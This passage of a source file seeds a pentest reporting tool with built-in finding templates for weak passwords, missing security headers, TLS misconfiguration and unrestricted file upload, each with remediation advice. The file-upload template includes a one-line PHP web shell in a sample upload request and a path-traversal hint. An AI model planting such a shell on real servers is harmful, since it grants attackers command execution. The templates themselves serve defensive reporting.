        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
        tags: ["owasp-a07", "authentication", "password"],
        fields: [
          { id: "t-wp-desc", fieldName: "description", fieldValue: "The application enforces a weak password policy that allows users to set passwords that are easily guessed or brute-forced. The policy does not enforce adequate length, complexity, or check against commonly-used passwords.\n\nThis significantly lowers the barrier for credential-based attacks such as brute forcing, credential stuffing, and password spraying." },
          { id: "t-wp-attack", fieldName: "attack_scenario", fieldValue: "The following weaknesses were identified:\n\n1. **Minimum length too short** — passwords as short as 4-6 characters are accepted\n2. **No complexity requirements** — purely numeric or common passwords allowed\n3. **No breached password check** — passwords from known breach lists are accepted\n4. **No maximum age** — passwords never expire\n5. **No reuse prevention** — users can cycle between the same few passwords" },
          { id: "t-wp-impact", fieldName: "impact", fieldValue: "Weak password policies enable:\n\n- **Brute force attacks** — short passwords can be cracked in seconds\n- **Credential stuffing** — breached passwords from other sites work here too\n- **Password spraying** — common passwords can be tried across many accounts\n- **Dictionary attacks** — common word-based passwords fall quickly\n- **Account takeover** — any of the above leads to unauthorised access" },
          { id: "t-wp-remed", fieldName: "remediation", fieldValue: "To remediate weak password policies:\n\n1. **Minimum length** — require at least 12 characters.\n2. **Breach database check** — reject passwords found in Have I Been Pwned or similar.\n3. **Password strength meter** — help users choose strong passwords.\n4. **Maximum age** — require password changes every 90 days for sensitive systems.\n5. **History enforcement** — prevent reuse of the last 12 passwords.\n6. **Multi-factor authentication** — MFA mitigates weak passwords significantly." },
          { id: "t-wp-refs", fieldName: "references", fieldValue: "- [NIST SP 800-63B](https://pages.nist.gov/800-63-3/sp800-63b.html)\n- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)\n- [CWE-521: Weak Password Requirements](https://cwe.mitre.org/data/definitions/521.html)" },
        ],
      },
      {
        id: "builtin-missing-headers",
        title: "Missing Security Headers",
        category: "Configuration",
        severity: "low",
        cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N",
        tags: ["owasp-a05", "headers", "configuration"],
        fields: [
          { id: "t-mh-desc", fieldName: "description", fieldValue: "The web application is missing critical security headers that protect against common web vulnerabilities. HTTP security headers instruct browsers to enable built-in protections such as XSS filtering, clickjacking prevention, and content type sniffing prevention.\n\nThe following headers are missing or misconfigured:\n- Content-Security-Policy (CSP)\n- X-Frame-Options\n- X-Content-Type-Options\n- Strict-Transport-Security (HSTS)\n- Referrer-Policy\n- Permissions-Policy" },
          { id: "t-mh-attack", fieldName: "attack_scenario", fieldValue: "Without security headers:\n\n1. **No CSP** — XSS payloads execute freely, no restriction on script sources\n2. **No X-Frame-Options** — the application can be embedded in iframes for clickjacking\n3. **No X-Content-Type-Options** — browsers may interpret responses as different content types\n4. **No HSTS** — initial HTTP connections are vulnerable to downgrade attacks\n5. **No Referrer-Policy** — sensitive URL parameters may leak to third parties via the Referer header" },
          { id: "t-mh-impact", fieldName: "impact", fieldValue: "Missing security headers:\n\n- **Amplify other vulnerabilities** — XSS, clickjacking become easier to exploit\n- **Allow content sniffing** — uploaded files may be interpreted as scripts\n- **Enable downgrade attacks** — traffic can be intercepted on first connection\n- **Leak information** — URL parameters and paths leak via Referer headers\n- **Fail compliance** — security header checks are standard in audits" },
          { id: "t-mh-remed", fieldName: "remediation", fieldValue: "Deploy the following headers:\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self'\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nReferrer-Policy: strict-origin-when-cross-origin\nPermissions-Policy: camera=(), microphone=(), geolocation=()\n```\n\nUse Helmet (Node.js), Django-SECURITY, or equivalent middleware." },
          { id: "t-mh-refs", fieldName: "references", fieldValue: "- [OWASP Secure Headers Project](https://owasp.org/www-project-secure-headers/)\n- [MDN: CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)\n- [securityheaders.com](https://securityheaders.com/)" },
        ],
      },
      {
        id: "builtin-tls-misconfig",
        title: "TLS/SSL Misconfiguration",
        category: "Cryptography",
        severity: "medium",
        cvssVector: "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N",
        tags: ["owasp-a02", "tls", "crypto"],
        fields: [
          { id: "t-tls-desc", fieldName: "description", fieldValue: "The TLS/SSL configuration of the web server is misconfigured, allowing the use of deprecated protocols (SSLv3, TLS 1.0, TLS 1.1), weak cipher suites, or insecure certificate configurations.\n\nThis weakens the encryption protecting data in transit and may allow attackers to intercept or manipulate communications." },
          { id: "t-tls-attack", fieldName: "attack_scenario", fieldValue: "Weak TLS configurations enable:\n\n1. **Protocol downgrade** — force negotiation to TLS 1.0 which has known vulnerabilities\n2. **BEAST/POODLE** — exploit protocol-level weaknesses\n3. **Cipher suite attacks** — RC4, CBC mode weaknesses\n4. **Certificate issues** — self-signed, expired, or mismatched certificates\n5. **BEAST** — exploit CBC mode in older TLS versions" },
          { id: "t-tls-impact", fieldName: "impact", fieldValue: "TLS misconfiguration can lead to:\n\n- **Data interception** — network-level attackers can decrypt traffic\n- **Man-in-the-middle** — modified content can be injected\n- **Credential theft** — login credentials transmitted over weak connections\n- **Compliance failure** — PCI-DSS requires TLS 1.2+\n- **Browser warnings** — users may see security warnings or be unable to connect" },
          { id: "t-tls-remed", fieldName: "remediation", fieldValue: "To remediate TLS misconfiguration:\n\n1. **Disable old protocols** — support only TLS 1.2 and TLS 1.3.\n2. **Strong cipher suites** — prefer AEAD ciphers (AES-GCM, ChaCha20-Poly1305).\n3. **Certificate management** — use valid certificates from trusted CAs, enable OCSP stapling.\n4. **HSTS** — enforce HTTPS with Strict-Transport-Security.\n5. **Test configuration** — use SSL Labs (ssllabs.com/ssltest/) to verify." },
          { id: "t-tls-refs", fieldName: "references", fieldValue: "- [SSL Labs Test](https://www.ssllabs.com/ssltest/)\n- [Mozilla SSL Configuration Generator](https://ssl-config.mozilla.org/)\n- [CWE-326: Inadequate Encryption Strength](https://cwe.mitre.org/data/definitions/326.html)" },
        ],
      },
      {
        id: "builtin-file-upload",
        title: "Unrestricted File Upload",
        category: "Injection",
        severity: "high",
        cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L",
        tags: ["owasp-a04", "file-upload"],
        fields: [
          { id: "t-fu-desc", fieldName: "description", fieldValue: "The application allows unrestricted file uploads without validating file type, content, size, or destination path. An attacker can upload malicious files including web shells, scripts, or executables that can be executed by the server or downloaded by other users.\n\nThe lack of validation allows attackers to upload files that can lead to remote code execution, stored XSS, or denial of service." },
          { id: "t-fu-attack", fieldName: "attack_scenario", fieldValue: "An attacker uploads a web shell:\n\n```\nPOST /upload\nContent-Type: multipart/form-data\n\n------\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n\n<?php system($_GET['cmd']); ?>\n------\n```\n\nAttack vectors:\n1. **Web shells** — upload executable scripts for RCE\n2. **SVG XSS** — upload SVG containing embedded JavaScript\n3. **HTML upload** — upload HTML files for stored XSS\n4. **Path traversal** — use `../../../` in filename to write to arbitrary paths\n5. **DoS** — upload extremely large files to fill disk" },
          { id: "t-fu-impact", fieldName: "impact", fieldValue: "Unrestricted file upload enables:\n\n- **Remote code execution** — web shells provide full server control\n- **Stored XSS** — uploaded HTML/SVG files execute JavaScript in other users' browsers\n- **Phishing** — upload convincing phishing pages on the trusted domain\n- **Data exfiltration** — uploaded files may bypass content scanning\n- **Denial of service** — disk exhaustion or memory consumption\n- **Malware distribution** — uploaded files can be downloaded by other users" },
          { id: "t-fu-remed", fieldName: "remediation", fieldValue: "To remediate unrestricted file upload:\n\n1. **Allowlist extensions** — only allow specific, safe file extensions.\n2. **Validate MIME type** — check the actual file content (magic bytes), not just the extension.\n3. **Rename files** — generate random filenames, never use user-supplied names.\n4. **Store outside webroot** — uploaded files should not be directly accessible via URL.\n5. **Size limits** — enforce maximum file sizes.\n6. **Content scanning** — scan uploads for malware.\n7. **Sandbox** — serve uploaded files from a separate, sandboxed domain." },
          { id: "t-fu-refs", fieldName: "references", fieldValue: "- [OWASP File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)\n- [CWE-434: Unrestricted Upload](https://cwe.mitre.org/data/definitions/434.html)\n- [CWE-22: Path Traversal](https://cwe.mitre.org/data/definitions/22.html)" },
        ],
      },
    ];

    // Insert templates
    const insertTemplate = db.prepare(
      `INSERT OR IGNORE INTO reporter_finding_templates
        (id, title, category, severity, cvss_vector, tags, is_builtin, usage_count, created_by, created_at, updated_at)
       VALUES (?, ?, ?, ?, ?, ?, 1, 0, NULL, ?, ?)`
    );

    for (const t of templates) {
      insertTemplate.run(t.id, t.title, t.category, t.severity, t.cvssVector, JSON.stringify(t.tags), now, now);
      insertTemplateFields(t.id, t.fields);
    }
  },
};
